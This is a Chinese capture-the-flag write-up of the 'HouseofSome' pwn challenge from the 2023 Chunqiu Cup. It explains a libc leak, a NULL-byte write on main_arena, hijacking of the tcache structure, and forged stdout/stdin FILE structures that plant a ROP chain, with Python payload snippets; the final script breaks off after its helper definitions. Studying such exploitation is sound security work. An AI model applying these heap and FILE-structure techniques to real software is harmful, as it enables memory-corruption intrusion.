<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="zh-CN" data-mode="dark">
  <head>
  <style>
    #canvas-dust {
      z-index: -65536;
      pointer-events: none;
      position: fixed;
      top: 0;
      left: 0;
    }
  </style>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" >
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps" />
<meta name="author" content="imLZH1" />
<meta property="og:locale" content="zh_CN" />
<meta name="description" content="‍" />
<meta property="og:description" content="‍" />
<link rel="canonical" href="http://localhost:4000/posts/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9Bpwn%E6%96%B9%E5%90%91houseofsome-WriteUps/" />
<meta property="og:url" content="http://localhost:4000/posts/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9Bpwn%E6%96%B9%E5%90%91houseofsome-WriteUps/" />
<meta property="og:site_name" content="imLZH1’ Blog" />
<meta property="og:image" content="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/log.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-01-26T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/log.png" />
<meta property="twitter:title" content="2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imLZH1"},"dateModified":"2024-01-26T00:00:00+08:00","datePublished":"2024-01-26T00:00:00+08:00","description":"‍","headline":"2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps","image":"/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/log.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9Bpwn%E6%96%B9%E5%90%91houseofsome-WriteUps/"},"url":"http://localhost:4000/posts/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9Bpwn%E6%96%B9%E5%90%91houseofsome-WriteUps/"}</script>
<!-- End Jekyll SEO tag -->


  <title>2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps | imLZH1' Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imLZH1' Blog">
<meta name="application-name" content="imLZH1' Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    

    <link rel="stylesheet" href="/assets/lib/fonts/main.css">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/lib/bootstrap/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/lib/fontawesome-free/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="/assets/lib/tocbot/tocbot.min.css">
  

  
    <link rel="stylesheet" href="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="/assets/lib/magnific-popup/magnific-popup.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<canvas id="canvas-dust"></canvas>
<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/tx.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">imLZH1' Blog</a>
    </h1>
    <!--
    <p class="site-subtitle fst-italic mb-0"></p>
    -->
    <p id="copywriting" class="site-subtitle fst-italic mb-0"></p>

    <script text="javascript">
          fetch('/assets/index_about.json',{headers:({
            'copywriting.jsion': 'application/x-www-form-urlencoded'
          })})
          .then(function(response) {
            return response.json();
          })
          .then(function(myJson) {
            var max = myJson.length;
            var copywritingId = Math.ceil(Math.random()*max)-1;
            console.log(`%c
      _    _.--.____.--._
     ( )=.-":;:;:;;':;:;:;"-._
      \\\\:;:;:;:;:;;:;::;:;:;:\\
       \\\\:;:;:;:;:;;:;:;:;:;:;\\
        \\\\:;::;:;:;:;:;::;:;:;:\\
         \\\\:;:;:;:;:;;:;::;:;:;:\\
          \\\\:;::;:;:;:;:;::;:;:;:\\
           \\\\;;:;:_:--:_:_:--:_;:;\\
            \\\\_.-"             "-._\\
             \\\\
              \\\\
               \\\\
                \\\\
                 \\\\
                  \\\\\ `,'color: #03A9F4; font-weight: bold');
            console.log(`%c `+myJson[copywritingId], `color: #03A9F4; font-weight: bold`);
            document.getElementById('copywriting').innerHTML = myJson[copywritingId];
          });
          </script>
	<script>
		'use strict';
		function getElement(string, item = document.documentElement) {
		    let tmp = item.querySelector(string);
		    if (tmp === null) {
			throw new Error("Unknown HTML");
		    }
		    return tmp;
		}
		function getParent(item, level = 1) {
		    while (level--) {
			let tmp = item.parentElement;
			if (tmp === null) {
			    throw new Error("Unknown HTML");
			}
			item = tmp;
		    }
		    return item;
		}
		function format(format, ...args) {
		    return format.replaceAll(/\$\*?[0-9]*/g, (match) => {
			if (match === '$*') {
			    return '';
			}
			let Index = match.slice(1);
			if (Index >= args.length) {
			    return '';
			}
			return args[Index];
		    });
		}
		class dust {
		    constructor(x = 50, y = 50) {
			this.vx = Math.random() * 1 + 1;
			this.vy = Math.random() * 1 + 0.01;
			this.shadowBlur = Math.random() * 3;
			this.shadowX = (Math.random() * 2) - 1;
			this.shadowY = (Math.random() * 2) - 1;
			this.radiusX = Math.random() * 1.5 + 0.5;
			this.radiusY = this.radiusX * (Math.random() * (1.3 - 0.3) + 0.3);
			this.rotation = Math.PI * Math.floor(Math.random() * 2);
			this.x = x;
			this.y = y;
		    }
		}
		class canvasDust {
		    constructor(canvasID) {
			this.color = '#fff';
			this.width = 300;
			this.height = 300;
			this.dustQuantity = 50;
			this.dustArr = [];
			this.inStop = false;
			this.build = () => {
			    this.resize();
			    if (this.ctx) {
				const point = canvasDust.getPoint(this.dustQuantity);
				for (let i of point) {
				    const dustObj = new dust(i[0], i[1]);
				    this.buildDust(dustObj);
				    this.dustArr.push(dustObj);
				}
				requestAnimationFrame(this.paint);
			    }
			};
			this.paint = () => {
			    if (this.inStop) {
				return;
			    }
			    const dustArr = this.dustArr;
			    for (let i of dustArr) {
				this.ctx.clearRect(i.x - 6, i.y - 6, 12, 12);
				if (i.x < -5 || i.y < -5) {
				    const x = this.width;
				    const y = Math.floor(Math.random() * window.innerHeight);
				    i.x = x;
				    i.y = y;
				}
				else {
				    i.x -= i.vx;
				    i.y -= i.vy;
				}
			    }
			    for (let i of dustArr) {
				this.buildDust(i);
			    }
			    requestAnimationFrame(this.paint);
			};
			this.buildDust = (dust) => {
			    const ctx = this.ctx;
			    ctx.beginPath();
			    ctx.shadowBlur = dust.shadowBlur;
			    ctx.shadowOffsetX = dust.shadowX;
			    ctx.shadowOffsetY = dust.shadowY;
			    ctx.ellipse(dust.x, dust.y, dust.radiusX, dust.radiusY, dust.rotation, 0, Math.PI * 2);
			    ctx.closePath();
			    ctx.fill();
			};
			this.resize = () => {
			    const canvas = this.canvas;
			    const width = window.innerWidth;
			    const height = window.innerHeight;
			    this.width = width;
			    this.height = height;
			    this.dustQuantity = Math.floor((width + height) / 38);
			    canvas.width = width;
			    canvas.height = height;
			    this.ctx.shadowColor =
				this.ctx.fillStyle = this.color;
			};
			this.stop = () => {
			    this.inStop = true;
			};
			this.play = () => {
			    if (this.inStop === true) {
				this.inStop = false;
				requestAnimationFrame(this.paint);
			    }
			};
			const canvas = getElement(canvasID);
			this.canvas = canvas;
			this.ctx = this.canvas.getContext('2d');
			this.build();
			window.addEventListener('resize', this.resize);
		    }
		}
		canvasDust.getPoint = (number = 1) => {
		    let point = [];
		    for (let i = 0; i < number; ++i) {
			const x = Math.floor(Math.random() * window.innerWidth);
			const y = Math.floor(Math.random() * window.innerHeight);
			point.push([x, y]);
		    }
		    return point;
		};
		try {
		    var canvasDusts = new canvasDust('#canvas-dust');
		}
		catch (e) { }
	  </script>	
	  


  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>首页</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>归档</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>关于</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/Friends/" class="nav-link">
            <i class="fa-fw fas fa-user-friends"></i>
            

            <span>FRIENDS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imLZH1"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github-alt"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['qingwachong','qq.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                首页
              </a>
            </span>

          
        
          
        
          
            
              <span>2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      文章
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="搜索..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">取消</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        发表于
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1706198400"
  data-df="YYYY/MM/DD"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  2024/01/26
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/log.png" class="popup img-link preview-img shimmer"><img src="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/log.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          作者

          <em>
            
              
                
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1214 字"
>
  <em>6 分钟</em>阅读</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p>‍</p>

<ul>
  <li><em>2023年春秋杯网络安全联赛冬季赛 ​</em>pwn 方向 <code class="language-plaintext highlighter-rouge">HouseofSome</code>​ , 题解</li>
</ul>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240125123059-tikfkoj.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240125123059-tikfkoj.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h2 id="程序保护和沙箱"><span class="me-2">程序保护和沙箱</span><a href="#程序保护和沙箱" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>​<a href="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240125171437-yz3uae2.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240125171437-yz3uae2.png" alt="image" loading="lazy"></a>​</p>

<p>​​</p>

<p>‍</p>

<h2 id="菜单功能-泄露libc上的地址"><span class="me-2">菜单功能 泄露libc上的地址</span><a href="#菜单功能-泄露libc上的地址" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>​<code class="language-plaintext highlighter-rouge">scannf("%ldd",&amp;xx)</code>​ 传入 <code class="language-plaintext highlighter-rouge">-</code>​ 后面报错 会给出 <code class="language-plaintext highlighter-rouge">libc上的地址</code>​</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240125124515-nb2wxhx.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240125124515-nb2wxhx.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h2 id="draw功能-任意地址写一个null-字节"><span class="me-2">draw功能 任意地址写一个NULL 字节</span><a href="#draw功能-任意地址写一个null-字节" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>通过上面泄露的<code class="language-plaintext highlighter-rouge">_IO_2_1_stdin_</code>​地址，我就基本上可以利用 <code class="language-plaintext highlighter-rouge">draw</code>​ 功能在 libc可写的地方写入一个NULL字节，写到哪里呢？？</li>
</ul>

<p>‍</p>

<ul>
  <li>写 到 main_arena + 1 (add 一个堆块 保证 top_chunk 的低地址是 0x00)</li>
  <li>需要爆破一点 保证 heap 地址起始是 <code class="language-plaintext highlighter-rouge">heap_base &amp; 0xFFFF == 0x0000</code>​​ ,然后攻击 <code class="language-plaintext highlighter-rouge">main_arena+1</code>​​ 的 位置 写 0x00 (利用 draw任意地址写 one null 字节， )</li>
  <li>
    <p>这样的话 <code class="language-plaintext highlighter-rouge">top_chunk</code>​ 就会指定 heap 的起始位置 也就是 <code class="language-plaintext highlighter-rouge">tcachebins</code>​ 结构体，下一次申请堆块的时候就可以 控制 <code class="language-plaintext highlighter-rouge">tcachebins</code>​ 结构体了，从而达到任意地址申请</p>
  </li>
  <li>攻击成功后 main_arena 地址就指向了 heap_base ， 也就是 修改了 top_chunk 的起始地址，申请的时候就会申请到 tcachebins 结构体上.</li>
</ul>

<h2 id="控制-tcachebins-结构体"><span class="me-2">控制 tcachebins 结构体</span><a href="#控制-tcachebins-结构体" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>攻击 tcache结构体 ,控制链表数量和申请的地址</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240122113008-xwv5be6.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240122113008-xwv5be6.png" alt="image" loading="lazy"></a>​</p>

<h2 id="任意读任意写"><span class="me-2">任意读，任意写</span><a href="#任意读任意写" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>
    <p>首先利用 <code class="language-plaintext highlighter-rouge">_IO_2_1_stdout_</code>​ 泄露 <code class="language-plaintext highlighter-rouge">environ</code>​ 也就是栈地址</p>
  </li>
  <li>
    <p>有了 stack地址 下一步就是利用 <code class="language-plaintext highlighter-rouge">_IO_2_1_stdin_</code>​ 任意地址写入， 在read 返回地址写 ORW_ROP</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">struct</span> <span class="n">_IO_FILE_plus</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">_IO_2_1_stdout_</span>
<span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">struct</span> <span class="n">_IO_FILE_plus</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">_IO_2_1_stdin_</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>攻击 <code class="language-plaintext highlighter-rouge">_IO_2_1_stdout_</code>​, <code class="language-plaintext highlighter-rouge">_IO_2_1_stdin_</code>​,fake_IO_FILE</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c1">#  攻击 _IO_2_1_stdout_ 任意地址内容泄露
</span><span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">environ</span><span class="sh">'</span><span class="p">]</span>
<span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFBAD1800</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">environ</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x240</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span> 


<span class="n">stack</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">1. </span><span class="sh">'</span><span class="p">))</span> <span class="o">-</span> <span class="mi">2408</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="c1"># read 的返回地址
</span><span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">stack</span><span class="sh">'</span><span class="p">)</span>

<span class="c1">#  攻击 _IO_2_1_stdin_ 任意地址写入内容
</span><span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mh">0x400</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x350</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span> 
</pre></td></tr></tbody></table></code></div></div>

<h2 id="最后的利用脚本"><span class="me-2">最后的利用脚本</span><a href="#最后的利用脚本" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
